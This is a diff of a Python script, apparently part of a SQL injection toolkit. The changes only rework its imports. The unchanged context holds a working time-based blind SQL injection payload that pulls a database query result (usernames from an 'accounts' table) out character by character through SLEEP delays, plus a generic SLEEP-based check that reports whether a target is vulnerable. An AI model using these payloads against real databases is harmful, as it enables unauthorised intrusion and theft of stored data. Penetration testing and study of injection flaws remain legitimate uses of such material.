@@ -1,8 +1,8 @@
 #!/bin/python
 
+import string
 import requests
-from sqlexploit import SqliExploit, MySqlConfig
-from string import Template
+from ..sqli_helper import SqliHelper, MySqlConfig
 
 # config
 sleep_duration = 1
@@ -23,7 +23,7 @@ def exec_request(request: str) -> bool:
 # Method 1 : check for the current request
 rq = "SELECT username FROM accounts ORDER BY username LIMIT 1,1"
 helper = SqliHelper(MySqlConfig(), exec_request)
-template_for_extract_string = Template(
+template_for_extract_string = string.Template(
     f'(SELECT 1 FROM (SELECT(SLEEP(IF(ORD(MID(($request),$index,1))$test,{sleep_duration},0))))a)'
 )
 helper.prepare_new(template=template_for_extract_string)
@@ -40,7 +40,7 @@ else:
     print("Target is not Vulnerable")
 
 # Method 2 : generic check
-template_for_check = Template(f'(SELECT 1 FROM (SELECT(SLEEP({sleep_duration})))a)')
+template_for_check = string.Template(f'(SELECT 1 FROM (SELECT(SLEEP({sleep_duration})))a)')
 if(helper.check(template=template_for_check)):
     print("Target is Vulnerable")
 else:
